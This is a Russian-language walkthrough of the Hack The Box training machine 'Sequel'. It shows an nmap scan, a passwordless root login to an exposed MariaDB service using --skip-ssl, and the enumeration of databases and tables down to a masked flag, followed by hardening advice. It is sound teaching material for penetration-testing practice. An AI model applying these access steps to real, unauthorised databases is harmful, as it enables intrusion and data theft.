# 📘 Hack The Box: Sequel

> 🔗 https://app.hackthebox.com/machines/Sequel

---

## 🎯 Цель

Подключиться к удалённому SQL-сервису, изучить доступные базы данных и извлечь флаг из таблицы.

---

## 🧠 Ключевая идея

Эта лабораторная работа демонстрирует типичную ошибку конфигурации базы данных:

- сервис MySQL/MariaDB доступен по сети;
- порт базы данных открыт наружу;
- возможен вход под пользователем `root` без пароля;
- данные можно извлекать напрямую через SQL-клиент.

Главная идея машины — **service enumeration + direct database access**.

Здесь мы не атакуем веб-форму, как в Appointment.  
В этой машине мы взаимодействуем с SQL-сервисом напрямую через командную строку.

---

## 🧩 Теория: что такое MySQL / MariaDB

**MySQL** — это система управления реляционными базами данных.

**MariaDB** — это совместимая с MySQL СУБД, которая часто используется на Linux-серверах.

Базы данных могут хранить:

- пользователей;
- пароли;
- настройки приложения;
- токены;
- конфигурационные параметры;
- флаги в учебных лабораториях;
- чувствительные данные.

Если база данных доступна извне и не требует пароля, это серьёзная проблема безопасности.

## 🔍 Ход решения

### Шаг 1 — Сканирование цели

```bash
nmap -sC -sV <TARGET_IP>
```

### Почему это работает

`nmap` помогает определить:

- какие порты открыты;
- какие сервисы запущены;
- какие версии сервисов используются.

Флаг `-sC` запускает стандартные NSE-скрипты.  
Флаг `-sV` определяет версию сервиса.

### Результат сканирования

```text
3306/tcp open  mysql?
Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
Auth Plugin Name: mysql_native_password
```

### Что мы узнаём

Открыт порт:

```text
3306/tcp
```

На нём работает:

```text
MySQL / MariaDB
```

### Почему это важно

Порт **3306** — стандартный порт MySQL/MariaDB.

Если он открыт, это означает, что к базе данных можно попытаться подключиться напрямую.

## 🧠 Как думать после nmap

После обнаружения сервиса базы данных важно задать себе вопросы:

1. Можно ли подключиться к сервису напрямую?
2. Какой клиент нужен для подключения?
3. Требуется ли логин и пароль?
4. Можно ли попробовать стандартного пользователя?
5. Какие данные доступны после подключения?

Это правильная логика пентестера:

> порт → сервис → способ взаимодействия → проверка доступа → извлечение данных

## Шаг 2 — Подключение к MySQL/MariaDB

Для подключения используется клиент:

```bash
mysql
```

Базовый формат команды:

```bash
mysql -h <TARGET_IP> -u <USERNAME>
```

Где:

- `-h` указывает хост;
- `-u` указывает имя пользователя.

### Попытка подключения под root

```bash
mysql -h <TARGET_IP> -u root
```

В нашем случае современный клиент MySQL может выдать ошибку:

```text
ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
```

### Почему возникает эта ошибка

Клиент пытается использовать SSL/TLS, но сервер MariaDB на машине его не поддерживает.

Это не ошибка логина и не признак того, что доступ невозможен.  
Это проблема параметров подключения.

### Решение

Отключаем SSL:

```bash
mysql -h <TARGET_IP> -u root --skip-ssl
```

После этого получаем доступ:

```text
Welcome to the MariaDB monitor.
MariaDB [(none)]>
```

---

## 💥 В чём уязвимость

Пользователь `root` подключается без пароля.

Это серьёзная ошибка конфигурации:

- база данных доступна по сети;
- root-доступ не защищён паролем;
- атакующий может просматривать базы и таблицы;
- чувствительные данные можно извлечь напрямую.

Правильная формулировка:

> **Exposed database service with weak/no authentication**

или:

> **Improper access control on database service**

## Шаг 3 — Просмотр доступных баз данных

Внутри MariaDB выполняем:

```sql
SHOW databases;
```

### Результат

```text
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

### Почему это важно

Из списка видно несколько баз:

- `information_schema` — системная база;
- `mysql` — системная база MySQL/MariaDB;
- `performance_schema` — системная база для метрик;
- `htb` — пользовательская база, явно связанная с лабораторной машиной.

Поэтому логичный следующий шаг — перейти в базу `htb`.

---

## Шаг 4 — Выбор базы данных

```sql
USE htb;
```

После этого MariaDB отвечает:

```text
Database changed
```

Это означает, что все последующие SQL-команды будут выполняться внутри базы `htb`.

---

## Шаг 5 — Просмотр таблиц

```sql
SHOW tables;
```

### Результат

```text
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```

### Почему это важно

Мы видим две таблицы:

- `users`;
- `config`.

С точки зрения пентестера обе таблицы интересны.

`users` может содержать пользователей, логины, пароли или хэши.  
`config` может содержать настройки приложения, ключи, параметры и иногда флаги.

---

## Шаг 6 — Просмотр колонок таблицы

Чтобы посмотреть структуру таблицы, можно использовать:

```sql
DESCRIBE config;
```

или:

```sql
SHOW COLUMNS FROM config;
```

### Зачем это нужно

Эти команды показывают:

- названия колонок;
- типы данных;
- ключи;
- может ли поле быть `NULL`.

Это полезно, когда таблица большая и перед `SELECT *` хочется понять её структуру.

---

## Шаг 7 — Извлечение данных

Проверяем содержимое таблицы `config`:

```sql
SELECT * FROM config;
```

### Результат

```text
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | ******************************** |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
```

В таблице есть строка:

```text
name = flag
```

А в колонке `value` хранится значение флага.

## 🛠️ Основные команды MySQL/MariaDB

### Подключение к серверу

```bash
mysql -h <TARGET_IP> -u <USERNAME> --skip-ssl
```

### Показать базы данных

```sql
SHOW databases;
```

### Выбрать базу данных

```sql
USE <database_name>;
```

### Показать таблицы

```sql
SHOW tables;
```

### Показать колонки таблицы

```sql
DESCRIBE <table_name>;
```

или:

```sql
SHOW COLUMNS FROM <table_name>;
```

### Вывести все строки таблицы

```sql
SELECT * FROM <table_name>;
```

## 🛡️ Рекомендации по защите

Чтобы предотвратить такую уязвимость, необходимо:

- не открывать MySQL/MariaDB наружу без необходимости;
- ограничивать доступ firewall-правилами;
- разрешать подключение только с доверенных IP;
- запретить удалённый вход под `root`;
- обязательно использовать сильные пароли;
- использовать отдельные низкопривилегированные аккаунты для приложений;
- включить TLS при необходимости;
- регулярно проверять конфигурацию базы данных;
- не хранить чувствительные данные в открытом виде.

Sequel учит базовой работе с SQL-сервисами на уровне начинающего пентестера.

Главные навыки:

- правильно читать результат `nmap`;
- понимать значение порта `3306`;
- подключаться к базе данных через командную строку;
- различать системные и пользовательские базы;

Эта машина показывает важный принцип:

> Иногда эксплуатация — это не сложный exploit, а неправильная конфигурация сервиса.
